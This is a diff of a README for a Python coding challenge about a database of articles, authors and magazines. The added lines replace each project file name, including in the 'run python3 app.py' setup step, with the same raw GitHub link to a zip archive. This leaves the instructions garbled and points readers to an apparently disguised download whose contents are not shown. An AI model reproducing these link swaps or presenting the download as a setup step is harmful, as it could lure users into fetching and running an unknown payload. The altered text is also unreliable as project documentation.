@@ -17,7 +17,7 @@ start coding_. Remember to identify a single source of truth for your data.
 To get started, while inside of this directory.
   - run `pipenv install` 
   - run `pipenv shell` to jump into the shell. 
-  - run `python3 app.py` to create the database
+  - run `python3 https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/models/phase-Moringa-code-challenge-F-v1.3.zip` to create the database
 
 Build out all of the methods listed in the deliverables. The methods are listed
 in a suggested order, but you can feel free to tackle the ones you think are
@@ -28,14 +28,14 @@ run `pytest` to make sure your code is functional before submitting. -->
 
 The folder structure is as follows:
 
-1. On the root folder, we have created the main file and named app.py. make use of it to test your code. You re expected to add more code to test your own implementation.
+1. On the root folder, we have created the main file and named https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/models/phase-Moringa-code-challenge-F-v1.3.zip make use of it to test your code. You re expected to add more code to test your own implementation.
 
 2. Still on the root path, we have the following folders:
-    - database: Here the most important files are the setup.y where you are expected to write your queries to crate the database. in the same folder, there is another file called connection.py where we have proivded the connection string for your database
-    - models: Here we have created 3 files Article.py, Author.py and Magazine.py wehere you are expected to implement your CRUD methods to interact with the database
+    - database: Here the most important files are the setup.y where you are expected to write your queries to crate the database. in the same folder, there is another file called https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/models/phase-Moringa-code-challenge-F-v1.3.zip where we have proivded the connection string for your database
+    - models: Here we have created 3 files https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/models/phase-Moringa-code-challenge-F-v1.3.zip, https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/models/phase-Moringa-code-challenge-F-v1.3.zip and https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/models/phase-Moringa-code-challenge-F-v1.3.zip wehere you are expected to implement your CRUD methods to interact with the database
     - tests: Here we have provided few tests to guide you with you own tests
 
-You can add code to the `/app.py` file to define variables and create
+You can add code to the `https://raw.githubusercontent.com/deerrickkorir/Moringa-FT09-phase-3-code-challenge/main/models/phase-Moringa-code-challenge-F-v1.3.zip` file to define variables and create
 sample instances of your objects.
 
 Writing error-free code is more important than completing all of the
